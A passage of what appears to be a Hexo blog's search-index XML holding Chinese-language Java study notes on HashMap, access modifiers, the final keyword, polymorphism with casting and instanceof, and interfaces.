Map&lt;K,V&gt;</code></p><ul><li>特点：<ol><li>HashMap 集合底层是哈希表：查询速度特别快<br>jdk1.8 之前：数组+单向链表<br>jdk1.8 之后，数组+单向链表|红黑树（链表的长度超过 8）：提高查询速度</li><li>HashMap 集合是一个无序的集合，存储元素和取出元素的顺序有可能不一致</li></ol></li></ul><h3 id="LinkedHashMap"><a href="#LinkedHashMap" class="headerlink" title="LinkedHashMap"></a>LinkedHashMap</h3><p><code>java.util.LinkedHashMap&lt;K,V&gt; extends HashMap&lt;K,V&gt;</code></p><ul><li>特点：<ol><li><code>LinkedHashMap</code>集合底层是哈希表+链表（保证迭代的顺序）</li><li><code>LinkedHashMap</code>集合是一个有序的集合，存储元素和取出元素的顺序是一致的</li></ol></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>泛型</title>
      <link href="/2021/10/10/%E6%B3%9B%E5%9E%8B/"/>
      <url>/2021/10/10/%E6%B3%9B%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限修饰符</title>
      <link href="/2021/10/09/%E6%9D%83%E9%99%90%E4%BF%AE%E9%A5%B0%E7%AC%A6/"/>
      <url>/2021/10/09/%E6%9D%83%E9%99%90%E4%BF%AE%E9%A5%B0%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>在Java中提供了四种访问权限，使用不同的访问权限修饰符修饰时，被修饰的内容会有不同的访问权限</p><ul><li>public：公共的。</li><li>protected：受保护的</li><li>default：默认的</li><li>private：私有的</li></ul><h3 id="不同权限的访问能力"><a href="#不同权限的访问能力" class="headerlink" title="不同权限的访问能力"></a>不同权限的访问能力</h3><table><thead><tr><th></th><th align="center">public</th><th align="center">protected</th><th align="center">(default)</th><th align="center">private</th></tr></thead><tbody><tr><td>同一个类</td><td align="center">√</td><td align="center">√</td><td align="center">√</td><td align="center">√</td></tr><tr><td>同一个包</td><td align="center">√</td><td align="center">√</td><td align="center">√</td><td align="center"></td></tr><tr><td>不同包子类</td><td align="center">√</td><td align="center">√</td><td align="center"></td><td align="center"></td></tr><tr><td>不同包非子类</td><td align="center">√</td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><blockquote><p>(default)并不是关键字“default”，而是根本不写。</p></blockquote><p>编写代码时，如果没有特殊的考虑，建议这样使用权限：</p><ul><li>成员变量使用private，隐藏细节。</li><li>构造方法使用public，方便创建对象。</li><li>成员方法使用public，方便调用方法。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>final关键字</title>
      <link href="/2021/10/08/final%E5%85%B3%E9%94%AE%E5%AD%97/"/>
      <url>/2021/10/08/final%E5%85%B3%E9%94%AE%E5%AD%97/</url>
      
        <content type="html"><![CDATA[<h1 id="final-关键字"><a href="#final-关键字" class="headerlink" title="final 关键字"></a>final 关键字</h1><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>子类可以在父类的基础上改写父类内容，比如，方法重写。那么我们能不能随意的继承 API 中提供的类，改写其内容呢？显然这是不合适的。为了避免这种随意改写的情况，Java 提供了 final 关键字，用于修饰不可改变内容。</p><ul><li>final：不可改变。可以用于修饰类、方法和变量。<ul><li>类：被修饰的类，不能被继承。</li><li>方法：被修饰的方法，不能被重写。</li><li>变量：被修饰的变量，不能被重新赋值。</li></ul></li></ul><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><ol><li><p>修饰类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">class</span> 类名 <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>修饰方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">修饰符 <span class="token keyword">final</span> 返回值类型 方法名<span class="token punctuation">(</span>参数列表<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//方法体</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>重写被<code>final</code>修饰的方法，编译就会报错</p></li><li><p>修饰变量</p><blockquote><p>对于基本类型来说，不可变说的是变量当中的数据不可改变</p><p>对于引用类型来说，不可变说的是变量当中的地址值不可改变</p></blockquote><ul><li><p>局部变量–基本类型</p><p>基本类型的局部变量，被<code>final</code>修饰后，只能赋值一次，不能再更改</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo01Final</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">final</span> <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">200</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// num2 = 250;// 错误写法，不能重新赋值</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>局部变量–引用类型</p><p>引用类型的局部变量，被 final 修饰后，只能指向一个对象，地址不能再更改。但是不影响对象内部的成员变量值的修改，代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo2Final</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 创建User对象</span>    <span class="token keyword">final</span> <span class="token class-name">User</span> u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 创建另一个User对象</span>    <span class="token comment">// u = new User();// 报错，指向了新的对象，地址值改变。</span>    <span class="token comment">// 调用setName方法</span>    u<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"张三"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 可以修改</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>成员变量</p><p>成员变量涉及到初始化的问题，初始化方式有两种，只能二选一</p><ul><li>显示初始化</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">final</span> <span class="token class-name">String</span> USERNAME <span class="token operator">=</span> <span class="token string">"张三"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>构造方法初始化</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">final</span> <span class="token class-name">String</span> USERNAME<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">,</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>USERNAME <span class="token operator">=</span> username<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ol><blockquote><p>不能使用一个 final 类作为父类</p><p>对于类和方法，abstract 关键字和 final 关键字不能同时使用</p><p>被 final 修饰的常量名称，一般都有书写规范，所有字母都大写。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多态</title>
      <link href="/2021/10/02/%E5%A4%9A%E6%80%81/"/>
      <url>/2021/10/02/%E5%A4%9A%E6%80%81/</url>
      
        <content type="html"><![CDATA[<h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><p>生活中，比如跑的动作，小猫、小狗和大象，跑起来是不一样的。再比如飞的动作，昆虫、鸟类和飞机，飞起来也是不一样的。可见，同一行为，通过不同的事物，可以体现出来的不同的形态。多态，描述的就是这样的状态。</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>多态是指同一行为，具有多个不同的表现形式</p><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><ol><li>继承或者实现</li><li>方法的重写</li><li>父类引用指向子类对象【格式体现】</li></ol><h3 id="体现"><a href="#体现" class="headerlink" title="体现"></a>体现</h3><h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java">父类类型 变量名 <span class="token operator">=</span> <span class="token keyword">new</span> 子类对象<span class="token punctuation">;</span>变量名<span class="token punctuation">.</span>方法名<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>父类类型：指子类对象继承的父类类型，或者实现的父接口类型</p></blockquote><h4 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Fu</span> f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>f<span class="token punctuation">.</span><span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>当使用多态方式调用方法时，首先检查父类中是否有该方法，如果没有，则编译出错；如果有，执行的是子类重写后的方法</p></blockquote><h3 id="多态的好处"><a href="#多态的好处" class="headerlink" title="多态的好处"></a>多态的好处</h3><p>实际开发的过程中，父类类型作为方法形式参数，传递子类对象给方法，进行方法的调用，更能体现出多态的扩展性与便利。</p><h3 id="引用类型转型"><a href="#引用类型转型" class="headerlink" title="引用类型转型"></a>引用类型转型</h3><ol><li><p><strong>向上转型</strong>：多态本身是子类类型向父类类型向上转换的过程，这个过程是默认的。</p><ul><li><p>向上转型一定是向上转型一定是安全的，没有问题的，</p><p>但是对象一旦向上转型为父类，那么就无法调用子类原本特有的内容。解决方案：用对象的向下转型</p></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java">父类类型 变量名 <span class="token operator">=</span> <span class="token keyword">new</span> 子类类型<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>如： <span class="token class-name">Animal</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>向下转型</strong>：父类类型向子类类型向下转换的过程，这个过程是强制的。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">子类类型 变量名 <span class="token operator">=</span> <span class="token punctuation">(</span>子类类型<span class="token punctuation">)</span> 父类变量名<span class="token punctuation">;</span><span class="token class-name">Cat</span> c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Cat</span><span class="token punctuation">)</span> animal<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h4 id="为什么要转型"><a href="#为什么要转型" class="headerlink" title="为什么要转型"></a>为什么要转型</h4><p>当使用多态方式调用方法时，首先检查父类中是否有该方法，如果没有，则编译错误。也就是说，不能调用子类拥有，而父类没有的方法。这也是多态给我们带来的一点”小麻烦”。所以，想要调用子类特有的方法，必须做向下转型。</p><p>定义类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token keyword">extends</span> <span class="token class-name">Animal</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"猫吃鱼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">catchMouse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"猫抓老鼠"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>定义测试类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo01Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 对象的向上转型，就是父类引用指向子类对象</span>        <span class="token class-name">Animal</span> animal <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 创建的时候是一只猫</span>        animal<span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// animal.catchMouse();// 错误</span>        <span class="token comment">// 向下转型，进行“还原”动作</span>        <span class="token class-name">Cat</span> cat <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Cat</span><span class="token punctuation">)</span> animal<span class="token punctuation">;</span>        cat<span class="token punctuation">.</span><span class="token function">catchMouse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 下面是错误的向下转型</span>        <span class="token comment">// 本来new的是一只猫，现在非要当做狗</span>        <span class="token comment">// 编译通过，但是运行会出现异常</span>        <span class="token comment">// Dog dog = (Dog) animal; // java.lang.ClassCastException，类转换异常</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="转型的异常"><a href="#转型的异常" class="headerlink" title="转型的异常"></a>转型的异常</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//向上转型</span>        <span class="token class-name">Animal</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a<span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用的是Cat的eat</span>        <span class="token comment">//向下转型</span>        <span class="token class-name">Dog</span> d <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Dog</span><span class="token punctuation">)</span> a<span class="token punctuation">;</span>        d<span class="token punctuation">.</span><span class="token function">watchHouse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用的是Dog的watchHouse【运行报错】</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码可以通过编译，但是运行时会<code>ClassCastException </code>,类型转换异常，这是因为创建的 Cat 类型对象无法转换成 Dog 类型的对象</p><p>为避免这样的问题，java 提供了<code>instanceof</code>关键字，给引用变量做类型的检验</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">变量名 <span class="token keyword">instanceof</span> 数据类型    如果变量属于该数据类型，返回<span class="token boolean">true</span>。    如果变量不属于该数据类型，返回<span class="token boolean">false</span>。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>所以转换前，我们最好先做一个判断，代码如下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Animal</span> animal <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        animal<span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>animal <span class="token keyword">instanceof</span> <span class="token class-name">Dog</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Dog</span> dog <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Dog</span><span class="token punctuation">)</span> animal<span class="token punctuation">;</span>            dog<span class="token punctuation">.</span><span class="token function">watchHouse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>animal <span class="token keyword">instanceof</span> <span class="token class-name">Cat</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Cat</span> cat <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Cat</span><span class="token punctuation">)</span> animal<span class="token punctuation">;</span>            cat<span class="token punctuation">.</span><span class="token function">catchMouse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>接口</title>
      <link href="/2021/10/01/%E6%8E%A5%E5%8F%A3/"/>
      <url>/2021/10/01/%E6%8E%A5%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>接口，是 Java 语言中一种引用类型，是方法的集合，是一种规范</p><p>定义接口与定义类方式相似，但是使用<code>interface</code>关键字。它也会被编译成.class 文件，但一定要明确它并不是类，而是另外一种引用数据类型。</p><blockquote><p>引用数据类型：数组，类，接口。</p></blockquote><p>接口的使用，它不能创建对象，但是可以被实现（<code>implements</code>，类似于被继承）。一个实现接口的类（可以看做是接口的子类），需要实现接口中所有的抽象方法，创建该类对象，就可以调用方法了。</p><h3 id="定义格式"><a href="#定义格式" class="headerlink" title="定义格式"></a>定义格式</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> 接口名称<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h3><p>在 java 9+版本中，接口内容可以有：</p><ol><li><strong>成员变量</strong>（其实是常量），格式：</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span><span class="token keyword">public</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">static</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">final</span><span class="token punctuation">]</span> 数据类型 常量名称 <span class="token operator">=</span> 数据值<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：</p><ul><li>常量必须进行赋值，而且一旦赋值不能改变</li><li>常量名称完全大写，用下划线进行分隔</li></ul><ol start="2"><li><strong>抽象方法</strong>（最重要）</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span><span class="token keyword">public</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">abstract</span><span class="token punctuation">]</span> 返回值类型 方法名称<span class="token punctuation">(</span>参数列表<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：</p><ul><li>没有方法体，该方法供子类实现使用</li><li>实现类必须覆盖重写接口中所有的抽象方法，除非实现类是抽象类</li></ul><ol start="3"><li><strong>默认方法</strong>（从 java 8 开始）</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span><span class="token keyword">public</span><span class="token punctuation">]</span> <span class="token keyword">default</span> 返回值类型 方法名称<span class="token punctuation">(</span>参数列表<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>方法体<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：</p><ul><li>默认方法也可以被覆盖重写</li></ul><ol start="4"><li><strong>静态方法</strong>(从 java 8 开始)</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span><span class="token keyword">public</span><span class="token punctuation">]</span> <span class="token keyword">static</span> 返回值类型 方法名称<span class="token punctuation">(</span>参数列表<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>方法体<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：</p><ul><li>应该<strong>通过接口名称进行调用</strong>，不能通过实现类对象进调用接口静态方法</li></ul><ol start="5"><li><strong>私有方法</strong>(java 9 开始)</li></ol><ul><li>普通私有方法（解决多个默认方法之间重复代码问题）</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> 返回值类型 方法名称<span class="token punctuation">(</span>参数列表<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>方法体<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>静态私有方法（解决多个静态方法之间重复代码问题）</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> 返回值类型 方法名称<span class="token punctuation">(</span>参数列表<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>方法体<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：</p><ul><li>private 的方法只有接口自己才能调用，不能被实现类或者别人使用</li></ul><ol start="6"><li><strong>接口中没有构造方法，不能创建对象</strong></li><li><strong>接口中没有静态代码块</strong></li></ol><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>类与接口的关系为实现关系，即类实现接口。该类可以称为接口的实现类，也可以称为接口的子类。实现的动作类似继承，格式相仿，只是关键字不同，实现使用<code>implements</code>关键字</p><p>非抽象子类实现接口：</p><ul><li>必须重写接口中的所有抽象方法</li><li>继承了接口的默认方法，既可以直接调用，也可以重写</li></ul><h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> 类名 <span class="token keyword">implements</span> 接口名<span class="token punctuation">&#123;</span>    <span class="token comment">//重写接口中的抽象方法</span>    <span class="token comment">//[重写接口中的默认方法]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="接口的多实现"><a href="#接口的多实现" class="headerlink" title="接口的多实现"></a>接口的多实现</h3><p>一个类只能继承一个父类。而对于接口而言，一个类是可以实现多个接口的，这叫做接口的多实现。并且，一个类能继承一个父类，同时实现多个接口。</p><h4 id="格式-1"><a href="#格式-1" class="headerlink" title="格式"></a>格式</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> 类名 <span class="token punctuation">[</span><span class="token keyword">extends</span> 父类名<span class="token punctuation">]</span> <span class="token keyword">implements</span> 接口名<span class="token number">1</span><span class="token punctuation">,</span> 接口名<span class="token number">2</span><span class="token punctuation">,</span> 接口名<span class="token number">3.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#123;</span>    <span class="token comment">//重写接口中抽象方法【必须】</span>    <span class="token comment">//重写接口中默认方法【不重名时可选】</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p><strong>抽象方法</strong></p><p>接口中，有多个抽象方法时，必须重写所有抽象方法。如果抽象方法有重名的，只需要重写一次</p></li><li><p><strong>默认方法</strong></p><p>接口中有多个默认方法时，实现类都可继承调用。如果默认方法有重名的，必须重写一次</p></li><li><p><strong>静态方法</strong></p><p>接口中存在重名的静态方法并不会冲突，原因是都只能通过各自的接口名来访问静态方法</p></li></ol><h4 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h4><p>当一个类，既继承一个父类，又实现若干个接口时，父类中的成员方法与接口中的默认方法重名，子类就近选择执行父类的成员方法。</p><h3 id="接口的多继承"><a href="#接口的多继承" class="headerlink" title="接口的多继承"></a>接口的多继承</h3><p>一个接口能继承另一个或者多个接口，这和类之间的继承比较相似。接口的继承使用<code>extends</code>关键字，子接口继承父接口的方法。如果父接口中的默认方法有重名的，那么子接口需要重写一次。</p><blockquote><p>子接口重写默认方法时，default 关键字可以保留。</p><p>子类重写默认方法时，default 关键字不可以保留。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抽象类</title>
      <link href="/2021/09/27/%E6%8A%BD%E8%B1%A1%E7%B1%BB/"/>
      <url>/2021/09/27/%E6%8A%BD%E8%B1%A1%E7%B1%BB/</url>
      
